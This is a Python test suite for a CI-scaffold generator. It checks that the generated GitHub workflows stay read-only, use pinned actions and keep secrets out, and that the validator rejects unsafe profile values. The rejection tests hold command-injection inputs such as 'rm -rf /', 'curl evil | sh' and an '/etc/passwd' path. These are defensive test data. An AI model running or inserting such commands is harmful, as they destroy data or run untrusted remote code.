import importlib.util
import json
from pathlib import Path
import tempfile
import unittest


HERE = Path(__file__).resolve().parents[1]


def load(name, path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


generator = load("public_generator", HERE / "generate.py")
checker = load("repository_checker", HERE / "templates/check_repository.py")


class BaselineTests(unittest.TestCase):
    def test_all_repositories_have_public_hosted_readonly_ci(self):
        for repo in generator.PROFILES["repositories"]:
            with self.subTest(repo=repo):
                output = generator.artifacts(repo)
                for name in (".github/workflows/ci.yml", ".github/workflows/copilot-setup-steps.yml"):
                    checker.validate_workflow(name, output[name].encode())
                ci = json.loads(output[".github/workflows/ci.yml"])
                self.assertEqual("ubuntu-24.04", ci["jobs"]["ci"]["runs-on"])
                self.assertIn("pull_request", ci["on"])
                self.assertNotIn("pull_request_target", ci["on"])

    def test_single_user_policy_does_not_require_self_approval(self):
        for repo in generator.PROFILES["repositories"]:
            policy = json.loads(generator.artifacts(repo)[".github/agent-policy.json"])
            self.assertEqual(0, policy["github_approving_review_count"])
            self.assertTrue(policy["no_bypass"])
            self.assertEqual(["core"], policy["review_floor"])
            self.assertEqual(["qa"], policy["behavior_changes_add"])

    def test_api_build_is_real_and_foundations_do_not_invent_builds(self):
        api = json.loads(generator.workflow("api"))["jobs"]["ci"]["steps"]
        self.assertIn("python scripts/quality.py build", api[-2]["run"])
        self.assertIn("coverage --base", api[-1]["run"])
        contracts = json.loads(generator.workflow("contracts"))["jobs"]["ci"]["steps"]
        self.assertEqual("python scripts/check_repository.py", contracts[-1]["run"])
        self.assertFalse(any("uses" in step and "setup-node" in step["uses"] for step in contracts))

    def test_sprint_scaffold_profiles_run_their_requested_commands(self):
        expected = {
            "web": ["npm ci", "npm run lint", "npm run format:check", "npm run typecheck", "npm test",
                    "npm run build", "npm run check:bundle", "npm run report:build",
                    "npm run check:bundle:planted"],
            "admin": ["npm ci --no-audit --no-fund", "npm run lint", "npm run typecheck",
                      "npm run check:imports", "npm test", "npm run build", "npm run smoke"],
            "ai-service": ['python -m pip install --quiet "uv>=0.11,<0.12"', "uv sync --locked",
                           "uv run --locked ruff check .", "uv run --locked ruff format --check .",
                           "uv run --locked mypy", "uv run --locked pytest"],
            "android": ["python scripts/quality_gates.py build", "python scripts/quality_gates.py test",
                        "python scripts/quality_gates.py lint", "python scripts/quality_gates.py coverage",
                        "python scripts/quality_gates.py self-test",
                        'python -m unittest discover -s scripts/tests -p "test_*.py"'],
        }
        for repo, commands in expected.items():
            with self.subTest(repo=repo):
                steps = json.loads(generator.workflow(repo))["jobs"]["ci"]["steps"]
                self.assertEqual("Run checks", steps[-1]["name"])
                self.assertEqual(["python scripts/check_repository.py", *commands], steps[-1]["run"].split("\n"))
                setup = json.loads(generator.workflow(repo, setup=True))["jobs"]["copilot-setup-steps"]["steps"]
                verify = [step for step in setup if step["name"] == "Verify repository"]
                self.assertEqual(["python scripts/check_repository.py"], [step["run"] for step in verify])
                self.assertEqual("python scripts/setup.py", setup[-1]["run"])

    def test_node_toolchain_only_where_declared(self):
        pin = generator.PROFILES["actions"]["setup-node"]
        for repo, profile in generator.PROFILES["repositories"].items():
            for setup in (False, True):
                with self.subTest(repo=repo, setup=setup):
                    job = json.loads(generator.workflow(repo, setup=setup))["jobs"]
                    steps = job["copilot-setup-steps" if setup else "ci"]["steps"]
                    node = [step for step in steps if step.get("uses", "").startswith("actions/setup-node@")]
                    if "node" in profile:
                        self.assertEqual([{"name": "Node", "uses": f"actions/setup-node@{pin}",
                                           "with": {"node-version-file": ".nvmrc"}}], node)
                        self.assertNotIn("cache", node[0]["with"])
                        self.assertEqual("Python", steps[steps.index(node[0]) - 1]["name"])
                    else:
                        self.assertEqual([], node)
        self.assertEqual({"web", "admin"}, {
            repo for repo, profile in generator.PROFILES["repositories"].items() if "node" in profile
        })

    def test_job_env_timeout_and_install_render_from_profile(self):
        for repo, profile in generator.PROFILES["repositories"].items():
            with self.subTest(repo=repo):
                for setup, job_name in ((False, "ci"), (True, "copilot-setup-steps")):
                    job = json.loads(generator.workflow(repo, setup=setup))["jobs"][job_name]
                    self.assertEqual(profile.get("timeout_minutes", 10), job["timeout-minutes"])
                    if "env" in profile:
                        self.assertEqual(profile["env"], job["env"])
                    else:
                        self.assertNotIn("env", job)
                setup_steps = json.loads(generator.workflow(repo, setup=True))["jobs"]["copilot-setup-steps"]["steps"]
                install = [step for step in setup_steps if step["name"] == "Install dependencies"]
                if "install" in profile:
                    self.assertEqual("\n".join(profile["install"]), install[0]["run"])
                    self.assertEqual("Verify repository", setup_steps[setup_steps.index(install[0]) - 1]["name"])
                else:
                    self.assertEqual([], install)
                ci_steps = json.loads(generator.workflow(repo))["jobs"]["ci"]["steps"]
                self.assertEqual([], [step for step in ci_steps if step["name"] == "Install dependencies"])
        self.assertEqual({"NEXT_TELEMETRY_DISABLED": "1"}, generator.PROFILES["repositories"]["web"]["env"])
        self.assertEqual(30, generator.PROFILES["repositories"]["api"]["timeout_minutes"])
        self.assertEqual(30, generator.PROFILES["repositories"]["android"]["timeout_minutes"])

    def test_ignore_attributes_and_guide_render_from_profile(self):
        for repo, profile in generator.PROFILES["repositories"].items():
            with self.subTest(repo=repo):
                output = generator.artifacts(repo)
                ignore = output[".gitignore"].split("\n")[:-1]
                self.assertEqual(generator.IGNORE + profile.get("ignore", []), ignore)
                self.assertIn("!.env.example", ignore)
                attributes = output[".gitattributes"].split("\n")[:-1]
                self.assertEqual(["* text=auto eol=lf", "*.jar binary", *profile.get("attributes", [])], attributes)
                guide = profile.get("developer_guide")
                for name in ("README.md", "AGENTS.md", "CONTRIBUTING.md"):
                    if guide:
                        self.assertIn(f"[{guide}]({guide})", output[name])
                        self.assertIn("not generated", output[name])
                    else:
                        self.assertNotIn("that guide is not generated", output[name])
        web = generator.artifacts("web")
        self.assertIn("Install Python 3.14, Git, and Node 24.14.0 (see `.nvmrc`), then run:", web["CONTRIBUTING.md"])
        self.assertIn("Install Python 3.14, Git, and JDK 21, then run:", generator.artifacts("api")["CONTRIBUTING.md"])
        self.assertIn("Install Python 3.14, Git, then run:", generator.artifacts("infra")["CONTRIBUTING.md"])
        self.assertTrue(web[".gitignore"].endswith("next-env.d.ts\n*.tsbuildinfo\n"))
        self.assertTrue(generator.artifacts("android")[".gitattributes"].endswith("gradlew.bat text eol=crlf\n"))

    def test_android_sdk_and_wrapper_steps_only_for_android(self):
        for repo, profile in generator.PROFILES["repositories"].items():
            with self.subTest(repo=repo):
                ci = json.loads(generator.workflow(repo))["jobs"]["ci"]["steps"]
                setup = json.loads(generator.workflow(repo, setup=True))["jobs"]["copilot-setup-steps"]["steps"]
                names = [step["name"] for step in ci]
                if repo == "android":
                    self.assertEqual(["Checkout", "Python", "JDK", "Android SDK packages",
                                      "Verify Gradle wrapper", "Run checks"], names)
                    self.assertEqual(["Checkout", "Python", "JDK", "Android SDK packages",
                                      "Verify repository", "Install managed hook"],
                                     [step["name"] for step in setup])
                    self.assertEqual({"distribution": "microsoft", "java-version": "21"}, ci[2]["with"])
                    sdk = ci[3]["run"]
                    self.assertIn('for package in "platforms;android-36" "build-tools;36.0.0" "platform-tools"; do', sdk)
                    self.assertIn('yes | "$manager" --licenses > /dev/null || true', sdk)
                    self.assertIn('"$manager" --install $missing', sdk)
                    self.assertLess(sdk.index("--licenses"), sdk.index("--install"))
                    self.assertNotIn("uses", ci[3])
                    self.assertNotIn("uses", ci[4])
                    self.assertEqual(
                        'echo "7a9ce74cff467ca1bf60a4fcd9f05185acceda4d0f382434d393e17864262c5d'
                        '  gradle/wrapper/gradle-wrapper.jar" | sha256sum -c -', ci[4]["run"])
                else:
                    self.assertNotIn("android_sdk", profile)
                    self.assertNotIn("gradle_wrapper_jar_sha256", profile)
                    for step in ci + setup:
                        self.assertNotIn(step["name"], {"Android SDK packages", "Verify Gradle wrapper"})
                        self.assertNotIn("sdkmanager", json.dumps(step))
                for step in ci + setup:
                    if "uses" in step:
                        self.assertRegex(step["uses"], r"^actions/(checkout|setup-python|setup-node|setup-java)@")

    def test_profile_values_that_could_change_generated_meaning_are_rejected(self):
        base = {"commands": ["python scripts/check_repository.py"]}
        bad = [
            {"node": "24"}, {"node": "24.14.0\nrm -rf /"}, {"java": "21 && curl evil"},
            {"timeout_minutes": "30"}, {"timeout_minutes": 0}, {"timeout_minutes": 361}, {"timeout_minutes": True},
            {"env": ["A=1"]}, {"env": {"lower": "1"}}, {"env": {"GITHUB_TOKEN": "x"}},
            {"env": {"RUNNER_TEMP": "/tmp"}}, {"env": {"ACTIONS_STEP_DEBUG": "true"}},
            {"env": {"TOKEN": "${{ secrets.TOKEN }}"}}, {"env": {"X": "a\nb"}}, {"env": {"X": 1}},
            {"ignore": ["!.env"]}, {"ignore": ["a\nb"]}, {"ignore": [" leading"]}, {"ignore": ["trailing "]},
            {"ignore": "next-env.d.ts"},
            {"attributes": ["* text\n* -text"]}, {"install": ["npm ci\ncurl evil | sh"]},
            {"commands": []}, {"commands": ["npm ci"]},
            {"commands": ["python scripts/check_repository.py", "bad\nline"]},
            {"developer_guide": "docs/development.txt"}, {"developer_guide": "../other/README.md"},
            {"developer_guide": "/etc/passwd.md"},
            {"gradle_wrapper_jar_sha256": "7a9ce74c"}, {"gradle_wrapper_jar_sha256": "G" * 64},
            {"android_sdk": ["platforms;android-36; rm -rf /"]}, {"android_sdk": ['"platform-tools"']},
            {"android_sdk": ["$HOME"]}, {"android_sdk": ["platform tools"]},
        ]
        for overrides in bad:
            with self.subTest(overrides=overrides):
                with self.assertRaises(ValueError):
                    generator.validate_profile("example", {**base, **overrides})
        generator.validate_profile("example", {
            **base, "node": "24.14.0", "java": "21", "timeout_minutes": 30,
            "env": {"NEXT_TELEMETRY_DISABLED": "1"}, "ignore": ["next-env.d.ts"], "attributes": ["gradlew.bat text eol=crlf"],
            "install": ["npm ci"], "developer_guide": "docs/development.md",
            "gradle_wrapper_jar_sha256": "0" * 64, "android_sdk": ["platforms;android-36", "platform-tools"],
        })
        for repo, profile in generator.PROFILES["repositories"].items():
            generator.validate_profile(repo, profile)

    def test_generated_output_passes_the_generated_repository_check(self):
        for repo in generator.PROFILES["repositories"]:
            with self.subTest(repo=repo), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                generator.generate(repo, root)
                files = {
                    path.relative_to(root).as_posix(): path.read_bytes()
                    for path in root.rglob("*") if path.is_file()
                }
                files["migration-source.json"] = b"{}\n"
                self.assertEqual([], checker.check(files))
                generated_checker = load(f"generated_checker_{repo.strip('.')}", root / "scripts/check_repository.py")
                self.assertEqual([], generated_checker.check(files))

    def test_generator_drift_and_determinism(self):
        for repo in ("web", "android"):
            with self.subTest(repo=repo), tempfile.TemporaryDirectory() as tmp:
                root = Path(tmp)
                generator.generate(repo, root)
                first = {path: path.read_bytes() for path in root.rglob("*") if path.is_file()}
                generator.generate(repo, root)
                self.assertEqual(first, {path: path.read_bytes() for path in root.rglob("*") if path.is_file()})
                generator.generate(repo, root, check=True)
                (root / "AGENTS.md").write_text("changed", encoding="utf-8")
                with self.assertRaisesRegex(ValueError, "Generated setup differs"):
                    generator.generate(repo, root, check=True)

    def test_secret_is_detected_without_echoing_value(self):
        value = ("gh" + "p_" + "a" * 36).encode()
        errors = checker.check({"example.txt": value})
        self.assertTrue(any("Possible credential" in item for item in errors))
        self.assertNotIn(value.decode(), "\n".join(errors))

    def test_duplicate_json_is_rejected(self):
        with self.assertRaisesRegex(ValueError, "Duplicate JSON"):
            checker.json_document(b'{"key": 1, "key": 2}')

    def test_unpinned_action_is_rejected(self):
        workflow = json.loads(generator.workflow("web"))
        workflow["jobs"]["ci"]["steps"][0]["uses"] = "actions/checkout@main"
        with self.assertRaisesRegex(ValueError, "immutable"):
            checker.validate_workflow(".github/workflows/ci.yml", json.dumps(workflow).encode())

    def test_privileged_trigger_is_rejected(self):
        workflow = json.loads(generator.workflow("web"))
        workflow["on"]["pull_request_target"] = {}
        with self.assertRaisesRegex(ValueError, "trigger"):
            checker.validate_workflow(".github/workflows/ci.yml", json.dumps(workflow).encode())

    def test_writable_token_and_self_hosted_are_rejected(self):
        for mutation in ("token", "runner"):
            workflow = json.loads(generator.workflow("web"))
            if mutation == "token":
                workflow["permissions"] = {"contents": "write"}
            else:
                workflow["jobs"]["ci"]["runs-on"] = ["self-hosted"]
            with self.assertRaises(ValueError):
                checker.validate_workflow(".github/workflows/ci.yml", json.dumps(workflow).encode())

    def test_secret_in_job_or_workflow_env_is_rejected(self):
        for level in ("job", "workflow"):
            workflow = json.loads(generator.workflow("web"))
            target = workflow["jobs"]["ci"] if level == "job" else workflow
            target["env"] = {"NPM_TOKEN": "${{ secrets.NPM_TOKEN }}"}
            with self.assertRaisesRegex(ValueError, "secrets"):
                checker.validate_workflow(".github/workflows/ci.yml", json.dumps(workflow).encode())

    def test_unimplemented_repositories_are_explicit(self):
        self.assertIn("foundation only", generator.PROFILES["repositories"]["contracts"]["state"])
        for repo in ("admin", "ai-service", "android", "web"):
            state = generator.PROFILES["repositories"][repo]["state"]
            with self.subTest(repo=repo):
                # The state may describe the scaffold but must still say what is not
                # implemented and must not declare the consumer scaffold accepted.
                self.assertRegex(state, r"no [a-z\-]+[^.;]* (?:is|are) implemented")
                self.assertIn(f"PenniLogic/{repo}#1", state)
                self.assertNotIn("accepted", state.lower())
        self.assertIn("no physical-device acceptance is claimed", generator.PROFILES["repositories"]["android"]["state"])


if __name__ == "__main__":
    unittest.main()
